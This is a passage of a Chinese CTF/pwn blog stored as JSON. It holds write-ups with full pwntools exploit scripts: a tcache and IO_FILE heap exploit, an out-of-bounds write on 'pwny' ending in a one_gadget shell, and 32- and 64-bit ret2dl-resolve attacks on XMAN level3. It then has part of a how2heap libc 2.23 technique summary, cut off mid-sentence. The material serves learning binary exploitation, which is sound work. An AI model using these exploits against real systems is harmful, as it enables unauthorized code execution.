libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(heap+0x10)+ #0x70\np64(IO_2_1_stdout_addr)) #0x80\nadd(0,0x78)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x68)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(heap+0x260)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)) #0x60\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\n#get final chunk\nadd(0,0x58)\nedit(0,p64(0x500)+p64(heap+0x2e0))\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nedit(0,orw)\ndelete(0)\n\np.interactive()\n```\n\n▲写得有点乱，为了达到效果中间加了不少不必要的，慢慢来吧，后面估计就能更好控tcache了。\n\n三、pwnmy：越界任意写\n\n这道题很有意思，用到了很多知识点。\n\n1.关于read函数：read(fd,&var,amount)\n\nread函数中的fd如果不为0，那么如果fd对应的Filehandle中没有数据，相当于没有被执行，如果有数据，那么就相当于是复制，将fd对应Filehandle中的数据复制amount个字节给var。其实本质来说read就是一个复制函数，只是fd为0代表标准输入，所以会从我们的输入中获取数据来复制。所以很多时候能够用到fd来出题。\n\n这里就用到题目的write函数，第一次write(256)越界，将fd对应的Filehandle中的随机值复制给byte_202860，此时byte_202860中的值为result = open(\"/dev/urandom\", 0);出来的随机值。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448117.png)\n\n之后再次write(256)越界，此时byte_202860从随机值中取一个字节：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448471.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448783.png)\n\n这里复现时为0x15，但是0x15没有对应的Filehandle，那么依据read函数的性质，相当于没有运行，所以byte_202860就会被赋值为0，这也就是为什么要write(256)两次的原因。\n\n2.关于getshell方法：\n\n(1)利用scanf函数，这个函数在接收过多输入时，会申请堆块，可以利用这个来用malloc和realloc调整栈帧配合one_gadget来getshell。因为我调试的时候所有的one_gadget都不满足。\n\n(2)利用exit函数，函数流为：\n\nexit()->__run_exit_handlers->_dl_fini->*******[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]\n\n而[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]位于结构体_rtld_global中，可读可写，所以利用任意写改掉_rtld_global中的函数指针为one_gadget即可。但是这里的One_gadget也都不符合，所以需要用到一些gadget来调整，这里自己找吧。\n\n推荐：https://www.cnblogs.com/bhxdn/p/14222558.html\n\n(3)利用environ，可以利用libc上的environ来获取栈地址，然后直接改栈上的返回地址吗，对应调整栈帧即可。这里改write的返回地址可以直接getshell。\n\n4.关于泄露地址：\n\n(1)libc地址：可以看到bss段上保存着三个标准符号：012->stdout,stdin,stderr。而这三个bss段变量在所有libc中都有，并且里面保存着对应的结构体的地址：\n\n_IO_2_1_stdout,_IO_2_1_stdin,_IO_2_1_stderr\n\n所以可以利用任意读来获取libc地址。\n\n(2)elf地址：由于之后需要修改libc地址吗，所以一定需要qword_202060的地址，而这个elf地址就只能往后找了，用qword_202060[v2]的相对偏移往后找了，这里自己找。\n\n▲综上所述，这道题也差不多了，考点还是挺多的，方法也挺多。\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwny\"\nlibc_file = \"./libc-2.27.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\n\ndef menu(idx):\n    sla(\": \", str(idx))\n\ndef write_fd(idx):\n    menu(2)\n    sla(\": \", str(idx))\n\n\ndef write(idx, con):\n    menu(2)\n    sla(\": \", str(idx))\n    sd(con)\n\ndef read(idx):\n    menu(1)\n    sa(\": \", idx)\n\nwrite_fd(256)\ngdb.attach(p)\npause()\n\nwrite_fd(256)\n\n#leak stderr\nread(p64(-4&0xffffffffffffffff))\nru(\": \")\nstderr_addr = int(ru(\"\\n\"), 16)\n\n#leak elf\nread(p64(-0xb&0xffffffffffffffff))\nru(\": \")\nelf_base = int(ru(\"\\n\"), 16) -0x202008\n\nlog.info(\"stderr_addr:0x%x\"%stderr_addr)\nlog.info(\"elf_base:0x%x\"%elf_base)\n\nqword_202060_addr = elf_base+0x202060\n\nobj = LibcSearcher(\"_IO_2_1_stderr_\", stderr_addr)\nlibc_base = stderr_addr-obj.dump('_IO_2_1_stderr_')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\n\nmalloc_hook_addr = libc_base + obj.dump(\"__malloc_hook\")\nrealloc_hook_addr = libc_base + obj.dump(\"__realloc_hook\")\nrealloc_addr = libc_base + obj.dump(\"realloc\")\n_rtld_global_addr = libc_base + obj.dump(\"_rtld_global_\")\n# offset1 = (_rtld_global_addr+3840 - qword_202060_addr)/8\n# offset2 = (_rtld_global_addr+3848 - qword_202060_addr)/8\noffset_malloc = (malloc_hook_addr-qword_202060_addr)/8\noffset_realloc_hook = (realloc_hook_addr-qword_202060_addr)/8\n# log.info(\"offset1:0x%x\"%offset1)\n# log.info(\"offset1:0x%x\"%offset2)\n\nlog.info(\"_rtld_global_addr:0x%x\"%_rtld_global_addr)\nlog.info(\"realloc_addr:0x%x\"%realloc_addr)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nlog.info(\"realloc_hook_addr:0x%x\"%realloc_hook_addr)\n\none_gadget = libc_base + 0x10a41c\nlog.info(\"one_gadget:0x%x\"%one_gadget)\n\n# write(offset1,p64(one_gadget))\n# write(offset2,p64(one_gadget))\nwrite(offset_malloc,p64(realloc_addr+0x4))\nwrite(offset_realloc_hook,p64(one_gadget))\n\n# gdb.attach(p)\n# pause()\n\nsl(\"9\"*0x1000)\np.interactive()\n```\n\n \n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"XMAN 2016-level3(32+64)","url":"/2021/08/14/XMAN 2016-level3(32+64)/","content":"\n一、32位程序\n\n1.常规checksec，开了Partial RELRO和NX，IDA找漏洞，很明显在vulnerable_function函数中存在栈溢出：\n\n```\n#注释头\n\nchar buf; // [esp+0h] [ebp-88h]\n----------------------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\n2.很多种方法，这里选择用ret2dl-resolve来尝试解决。\n\n3.关于ret2dl-resolve介绍，篇幅太长，不说了，后面放资料链接，介绍一下装载流程：\n\n(1)通过struct link_map *l获得.dynsym、.dynstr、.rel.plt地址\n(2)通过reloc_arg+.rel.plt地址取得函数对应的Elf32_Rel指针，记作reloc\n(3)通过reloc->r_info和.dynsym地址取得函数对应的Elf32_Sym指针，记作sym\n(4)检查r_info最低位是否为7\n(5)检查(sym->st_other)&0x03是否为0\n(6)通过strtab+(sym->st_name)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数。\n\n4.首先思考exp编写的攻击思路，由于栈溢出的比较少，而ret2dl-resolve攻击需要构造几个结构体，所占空间较大，所以这里进行栈劫持，将栈劫持到程序运行过程中生成的bss段上。之后再在栈上布置结构体和必要数据，重新执行延迟绑定，劫持动态装载，将write函数装载成system函数，并且在劫持的同时将Binsh字符串放在栈上，这样劫持完成后就直接调用system函数，参数就是binsh。\n\n(1)首先需要找到相关的数据地址：\n\n```\n#注释头\n\nwrite_got = 0x0804a018\nread_plt = 0x08048310\nplt0_addr = 0x08048300\nleave_ret = 0x08048482\npop3_ret = 0x08048519\npop_ebp_ret = 0x0804851b\nnew_stack_addr = 0x0804a500 \n#程序运行起来才会有，bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错\n\nrelplt_addr = 0x080482b0 \n#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf32_Rel偏移构造reloc_arg\n\ndynsym_addr = 0x080481cc \n#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf32_Sym结构体偏移来构造Elf32_Rel.r_info\n\ndynstr_addr = 0x0804822c \n#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移来构造Elf32_Sym.st_name\n```\n\n这里寻找的relplt_addr，dynsym_addr，dynstr_addr一般都是位于ELF文件头部的LOAD段。用readelf -S binary也可以看到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516027.jpeg)\n\n①relplt_addr：0x080482b0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516591.jpeg)\n\n②dynsym_addr：0x080481cc\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\n③dynstr_addr：0x0804822c\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516123.jpeg)\n\n(2)再进行栈劫持：\n\n```\n#注释头\n\npayload = \"\"\npayload += 'A'*140 #padding\npayload += p32(read_plt) \n#调用read函数往新栈写值，防止leave; retn到新栈后出现ret到地址0上导致出错\npayload += p32(pop3_ret) \n#read函数返回地址，从栈上弹出三个参数从而能够将esp拉到pop_ebp_ret的地方来执行\npayload += p32(0) #fd = 0\npayload += p32(new_stack_addr) #buf = new_stack_addr\npayload += p32(0x400) #size = 0x400\npayload += p32(pop_ebp_ret)\n#把新栈顶给ebp\npayload += p32(new_stack_addr)\npayload += p32(leave_ret)\n#模拟函数返回，利用leave指令把ebp的值赋给esp，完成栈劫持，同时ebp指向第二段payload的第一个内容，eip为第二段payload中的plt0_addr\n\nio.send(payload) #此时程序会停在使用payload调用的read函数处等待输入数据\n```\n\n(3)伪造两个结构体和必要的数据：\n\n```\n#注释头\n\n\nfake_Elf32_Rel_addr = new_stack_addr + 0x50\n#在新栈上选择一块空间放伪造的Elf32_Rel结构体，结构体大小为8字节\n\nfake_Elf32_Sym_addr = new_stack_addr + 0x5c \n#在伪造的Elf32_Rel结构体后面接上伪造的Elf32_Sym结构体，结构体大小为0x10字节\n\nfake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr \n#计算伪造的reloc_arg\n\nfake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr \n#伪造的Elf32_Sym结构体后面接上伪造的函数名字符串system_addr \n\nfake_r_info = ((fake_Elf32_Sym_addr - dynsym_addr)/0x10) << 8 | 0x7 \n#伪造r_info，偏移要计算成下标，除以Elf32_Sym的大小，最后一字节为0x7\n\n\nfake_Elf32_Rel_data = \"\"\nfake_Elf32_Rel_data += p32(write_got) \n#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误\nfake_Elf32_Rel_data += p32(fake_r_info)\n\nfake_Elf32_Sym_data = \"\"\nfake_Elf32_Sym_data += p32(fake_st_name_addr)\nfake_Elf32_Sym_data += p32(0) \n#后面的数据直接套用write函数的Elf32_Sym结构体\nfake_Elf32_Sym_data += p32(0)\nfake_Elf32_Sym_data += p8(0x12)\nfake_Elf32_Sym_data += p8(0)\nfake_Elf32_Sym_data += p16(0)\n\nbinsh_addr = new_stack_addr + 0x74 #把/bin/sh\\x00字符串放在最后面\n```\n\n①reloc_arg作用：作为偏移值，与relplt_addr相加得到ELF32_Rel结构体的地址。这里设置成fake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr，那么相加之后就可以直达我们设置的fake_ELF32_Rel结构体位置。\n\n②st_name_addr作用：作为偏移值，与dynstr_addr相加得到存放函数名的地址。如果按照原本的重定位，那么此处计算之后存放的应该是write，所以这里将其改为system，放在所有数据的最后面，将地址存放到fake_Elf32_Sym结构体中，设置为fake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr，这样相加之后就会定位到new_stack_addr + 0x6c，即我们劫持栈上的system字符串地址处，从而劫持装载。\n\n③r_info作用：作为偏移值，使得结构体数组Elf32_Sym[r_info>>8]来找到存放write的结构体Elf32_Sym。我们知道结构体数组寻址方式其实就是addr = head_addr + size*indx，也就是首地址加上数组中元素大小乘以索引。这里由于伪造了Elf32_Sym结构体，所以我们的r_info>>8 = indx应该是addr - head_addr/size，对应的就是(fake_Elf32_Sym_addr - dynsym_addr)/0x10，得到最终的r_info为((fake_Elf32_Sym_addr - dynsym_addr)/0x10)<<8。\n\n④设置write的Elf32_Sym结构体时，可以通过命令readelf -r binary，找到write的r_info偏移为407：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516168.jpeg)\n\n之后输入objdump -s -j .dynsym level3，查找偏移为4的Elf32_Sym结构体内容：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516927.jpeg)\n\n这里就是0x804820c，对应的内容为：\n\n```\n#注释头\n\n\nst_name = 31000000\nst_value = 00000000\nst_size = 00000000\nst_info = 12\nst_other = 00\nst_shndx = 0000\n```\n\n▲其实在IDA中看的更清楚：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\n同时由于搜寻数据时，需要查找类型R_386_JUMP_SLOT，该索引为r_info的最后一个字节，所以需要将r_info的最后一个字节设置为0x07，来通过检查。\n\n▲以下为两个结构体内容：\n\n```\n#注释头\n\n#Elf32_Rel结构体：大小为0x08\ntypedef struct {\n    Elf32_Addr r_offset;   // 对于可执行文件，此值为虚拟地址\n    Elf32_Word r_info;     // 符号表索引\n} Elf32_Rel;\n\n\n#Elf32_Sym结构体：大小为0x10\ntypedef struct\n{\n    Elf32_Word st_name;      // Symbol name(string tbl index)\n    Elf32_Addr st_value;     // Symbol value\n    Elf32_Word st_size;      // Symbol size\n    unsigned char st_info;   // Symbol type and binding\n    unsigned char st_other;  // Symbol visibility under glibc>=2.2\n    Elf32_Section st_shndx;  // Section index\n} Elf32_Sym;\n```\n\n(4)将伪造的结构体和必要数据放在bss新栈上，从plt0_addr开始执行，调用write函数，重新装载write函数，劫持成system函数，同时修改参数为binsh，直接getshell。\n\n```\n#注释头\n\n#执行数据：\npayload = \"\"\npayload += \"AAAA\"              #位于new_stack_addr,占位用于pop ebp\npayload += p32(plt0_addr)      #位于new_stack_addr+0x04,调用PLT[0]\npayload += p32(fake_reloc_arg) #位于new_stack_addr+0x08,传入伪造的reloc_arg\npayload += p32(0)              #位于new_stack_addr+0x0c,system函数返回值\npayload += p32(binsh_addr)     #位于new_stack_addr+0x10,修改参数为/bin/sh字符串地址\n\n#伪造的内容数据：\npayload += \"A\"*0x3c            #位于new_stack_addr+0x14,padding\npayload += fake_Elf32_Rel_data #位于new_stack_addr+0x50,Elf32_Rel结构体\npayload += \"AAAA\"              #位于new_stack_addr+0x58，padding\npayload += fake_Elf32_Sym_data #位于new_stack_addr+0x5c,Elf32_Sym结构体\npayload += \"system\\x00\\x00\"    #位于new_stack_addr+0x6c,传入system函数名\npayload += \"/bin/sh\\x00\"       #位于new_stack_addr+0x74,传入binsh字符串\n\nio.send(payload)\nio.interactive()\n```\n\n▲不同版本的libc也不太一样，在libc2.27及以下试过都行，但2.30及以上好像就不可以，可能版本改了多了一些检查吧。\n\n \n\n二、64位程序：\n\n1.完全一样，只是程序改成了64位，在64位条件下有些发生了变化：\n\n(1)两大结构体发生变化：\n\n```\n#注释头\n\n#Elf64_Rela结构体：大小为0x18\ntypedef struct\n{\n  Elf64_Addr  r_offset;          /(0x08)* Address */\n  Elf64_Xword  r_info;           /(0x08)* Relocation type and symbol index */\n  Elf64_Sxword  r_addend;        /(0x08)* Addend */\n} Elf64_Rela;\n\n#Elf64_Sym结构体：大小为0x18\ntypedef struct\n{\n  Elf64_Word  st_name;           /(0x04)* Symbol name (string tbl index) */\n  unsigned char  st_info;        /(0x01)* Symbol type and binding */\n  unsigned char  st_other;       /(0x01)* Symbol visibility */\n  Elf64_Section  st_shndx;       /(0x02)* Section index */\n  Elf64_Addr  st_value;          /(0x08)* Symbol value */\n  Elf64_Xword  st_size;          /(0x08)* Symbol size */\n} Elf64_Sym;\n```\n\n![elf64_rel](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516705.png)\n\n![elf64_sym](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516393.png)\n\n(2)寻址方式发生变化，不再是直接寻址，而是通过一个数组寻址，并且如果索引过大，会造成数组越界，程序崩溃。这里就需要设置link_map里的某些参数，置为0，才能跳过其中的判断语句，使得伪造的r_info能够起作用，所以这里还需要先泄露link_map的地址：(或者直接伪造link_map)\n\n▲ GOT+4(即GOT[1])为动态库映射信息数据结构link_map 地址；GOT+8(即GOT[2])为动态链接器符号解析函数的地址_dl_runtime_resolve。\n\n(3)同时由于通过数组索引，所以需要进行0x18的对齐，确保通过索引n*0x18到的地址是我们伪造的结构体。\n\n2.思考exp编写：\n\n(1)各种前置地址：\n\n```\nvulfun_addr = 0x4005e6\nwrite_got = 0x600A58\nread_got = 0x600A60\nplt0_addr = 0x4004a0\nlink_map_got = 0x600A48\n#GOT[1]的地址\nleave_ret = 0x400618\npop_rdi_ret = 0x4006b3\npop_rbp_ret = 0x400550\n\nnew_stack_addr = 0x600d88 \n#程序运行起来才会有，bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错\n\nrelplt_addr = 0x400420 \n#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf64_Rela偏移构造reloc_arg\n\ndynsym_addr = 0x400280\n#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf64_Sym结构体偏移构造Elf64_Rela.r_info\n\ndynstr_addr = 0x400340\n#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移构造Elf64_Sym.st_name\n```\n\n(2)泄露link_map的地址:\n\n```\n#注释头\n\nuniversal_gadget1 = 0x4006aa\t\n#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn\nuniversal_gadget2 = 0x400690\t\n#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]\n\n#使用万能gadgets调用write泄露link_map地址\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1) #rbp，随便设置\npayload += p64(write_got)\npayload += p64(0x8)\npayload += p64(link_map_got)\npayload += p64(0x1)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #栈修正\npayload += p64(vulfun_addr) #返回到vulnerable_function处\n\nio.send(payload)\nio.recvuntil(\"Input:\\n\")\nlink_map_addr = u64(io.recv(8))\nlog.info(\"Leak link_map address:%#x\" %(link_map_addr))\n```\n\n(3)进行栈劫持：\n\n```\n#注释头\n\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1)\npayload += p64(read_got) #使用万能gadgets调用read向新栈中写入数据\npayload += p64(0x500)\npayload += p64(new_stack_addr)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #栈修正\n\npayload += p64(pop_rbp_ret) \n#返回到pop rbp; retn，劫持栈。此处直接劫持栈是因为如果继续修改link_map+0x1c8会导致ROP链过长，栈上的环境变量指针被破坏，从而导致system失败。\npayload += p64(new_stack_addr)\npayload += p64(leave_ret)\n\nio.send(payload)\n```\n\n(4)伪造两大结构体和必要数据：\n\n```\n#注释头\n\nfake_Elf64_Rela_base_addr = new_stack_addr + 0x150 \n#新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐\n\nfake_Elf64_Sym_base_addr = new_stack_addr + 0x190\n#新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠\n\nfake_st_name = new_stack_addr + 0x1c0 - dynstr_addr \n#计算伪造的st_name数值，为伪造函数字符串system与.dynstr节开头间的偏移\n\nbinsh_addr = new_stack_addr + 0x1c8 \n#\"/bin/sh\\x00\"所在地址，计算得到的\n\n#计算两个结构体的对齐填充字节数，两个结构体大小都是0x18\nrel_plt_align = 0x18 - (fake_Elf64_Rela_base_addr - relplt_addr) % 0x18 \nrel_sym_align = 0x18 - (fake_Elf64_Sym_base_addr - dynsym_addr) % 0x18\n\n#加上对齐值后为结构体真正地址\nfake_Elf64_Rela_addr = fake_Elf64_Rela_base_addr + rel_plt_align \nfake_Elf64_Sym_addr = fake_Elf64_Sym_base_addr + rel_sym_align\n\nfake_reloc_arg = (fake_Elf64_Rela_addr - relplt_addr)/0x18 \n#计算伪造的reloc_arg，由于是数组索引下标，所以需要除以结构体大小0x18\n\nfake_r_info = (((fake_Elf64_Sym_addr - dynsym_addr)/0x18) << 0x20) | 0x7 \n#伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7\n\n\nfake_Elf64_Rela_data = \"\"\nfake_Elf64_Rela_data += p64(write_got) \n#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误\nfake_Elf64_Rela_data += p64(fake_r_info)\nfake_Elf64_Rela_data += p64(0)\n\nfake_Elf64_Sym_data = \"\"\nfake_Elf64_Sym_data += p32(fake_st_name)\nfake_Elf64_Sym_data += p8(0x12)\n#后面的数据直接套用write函数的Elf64_Sym结构体，这里要注意数据大小\nfake_Elf64_Sym_data += p8(0)\nfake_Elf64_Sym_data += p16(0)\nfake_Elf64_Sym_data += p64(0)\nfake_Elf64_Sym_data += p64(0)\n```\n\n(5)将link_map+0x1c8置0之后，直接再次重定位write函数，劫持为system函数，getshell:\n\n```\n#注释头\n\n#使用万能gadgets调用read把link_map+0x1c8置为0\npayload = \"\"\npayload += \"AAAAAAAA\"\npayload += p64(universal_gadget1)\npayload += p64(0x0)\npayload += p64(0x1) #rbp设置为1\npayload += p64(read_got)\npayload += p64(0x8)\npayload += p64(link_map_addr + 0x1c8)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #栈修正\n\n#为system函数设置参数\"/bin/sh\\x00\"，由于plt[0]函数调用重定位取参仍然是从栈上取，不会用到rdi寄存器传参，所以这里直接先传参也可。\npayload += p64(pop_rdi_ret) \npayload += p64(binsh_addr)\n\npayload += p64(plt0_addr)\npayload += p64(fake_reloc_arg)\npayload = payload.ljust(0x150, \"A\") #padding\n\npayload += 'A'*rel_plt_align\npayload += fake_Elf64_Rela_data\npayload = payload.ljust(0x190, \"A\") #padding\n\npayload += 'A'*rel_sym_align\npayload += fake_Elf64_Sym_data\npayload = payload.ljust(0x1c0, \"A\") #padding\npayload += \"system\\x00\\x00\"\npayload += \"/bin/sh\\x00\"\n\nio.send(payload) #写入该段payload,将数据读取到新栈\nio.send(p64(0)) #执行新栈上的相关代码，设置link_map+0x1c8为0。\n\nio.interactive()\n```\n\n▲其实还是一知半解，等先打完基础再来深究吧。\n\n \n\n参考资料：\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/\n\nhttps://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=44816&ctid=157\n\nhttps://syst3mfailure.github.io/ret2dl_resolve\n\nhttps://xz.aliyun.com/t/5722\n","tags":["First"],"categories":["PWN","RROP0xa"]},{"title":"how2heap_libc2.23_summary","url":"/2021/08/14/how2heap_libc2.23_summary/","content":"\n1.first_fit:\n\nunsortedbin中切割原则，常用来泄露地址\n\n \n\n2.fastbin_dup：\n\n```\n#注释头\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\nmalloc(x)=a,malloc(x)=b,malloc(x)=a\n```\n\n \n\n3.fastbin_dup_into_stack:\n\n```\n#注释头\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\n\n//malloc(x)得到a，此时a还在fastbin中，之后修改a的fd为fakechunk，使得:\nfastbinsY.fd->b,b.fd->a,a.fd->fakechunk\n\n//再次申请得到fakechunk\nmalloc(x)=b,malloc(x)=a,malloc(x)=fakechunk\n//这里就可以使得fakechunk位于栈上，从而使得堆分配到栈中控制栈上的原先不可控数据。\n```\n\n \n\n4.fastbin_dup_consolidate\n\n```\n#注释头\n\na=malloc(x),b=malloc(x)\nfree(a)//a进入fastbin中\n\nc = malloc(0x400)\n//申请large bin的时候已经执行了malloc_consolidate，使得fastbin中的a放入smallbin中\n\nfree(a)\n//并不会报错,因为这个时候a已经被放到了smallbin之中,fastbin中没有a,之后a再次进入fastbin中\n\n//此时的a中信息如下：\na.bk->smallbin\na.fd->0//由于处在fastbin的第一个，所以fd被清空\n\nmalloc(x) = a//这时候a中存在smallbin的信息，可以进行泄露\nmalloc(x) = a//可以再次申请，再次得到a\n```\n\n \n\n5.house_of_einherjar：\n\n在当前chunk中构造fakechunk，利用溢出漏洞修改下一个chunk的presize和pre_inuse。之后释放下一个chunk连上fakechunk一起进入Bins中，再通过当前chunk修改进入bins中chunk的fd,bk，从而实现任意地址读写。\n\n(1)申请三个chunk，chunk1,chunk2,chunk3\n\n(2)在chunk1中制造fakechunk//这里需要绕过一些检查\n\n①构造：\n\n```\n#注释头\n\nfake_chunk->size = sizeof(chunk1)-0x10\n```\n\n绕过pre_size的检查：\n\n```\n#注释头\n\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))     \n      malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n这段代码意思就是当前chunk的size如果不等于下一个chunk的pre_size域，则出错\n\n②构造：\n\n```\n#注释头\n\nfake_chunk->fd = chunk1\nfake_chunk->bk = chunk1\n```\n\n绕过双向链表的检查：\n\n```\n#注释头\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))      \n      malloc_printerr (\"corrupted double-linked 